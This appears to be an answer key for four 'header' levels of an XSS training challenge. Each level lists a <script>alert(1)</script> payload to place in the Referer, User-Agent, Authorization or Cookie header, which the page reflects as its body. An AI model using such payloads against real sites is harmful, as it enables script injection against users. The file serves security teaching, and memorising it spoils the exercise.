# header — solutions

Raw header values reflected as the entire response body — set the header to a script payload.

### header-level1

`[Header] /header/level1/`

- payload: `<script>alert(1)</script>`
- context: Referer header reflected as body
- header: `Referer: <script>alert(1)</script>`

### header-level2

`[Header] /header/level2/`

- payload: `<script>alert(1)</script>`
- context: User-Agent reflected as body
- header: `User-Agent: <script>alert(1)</script>`

### header-level3

`[Header] /header/level3/`

- payload: `<script>alert(1)</script>`
- context: Authorization reflected as body
- header: `Authorization: <script>alert(1)</script>`

### header-level4

`[Header] /header/level4/`

- payload: `<script>alert(1)</script>`
- context: Cookie reflected as body
- header: `Cookie: <script>alert(1)</script>`
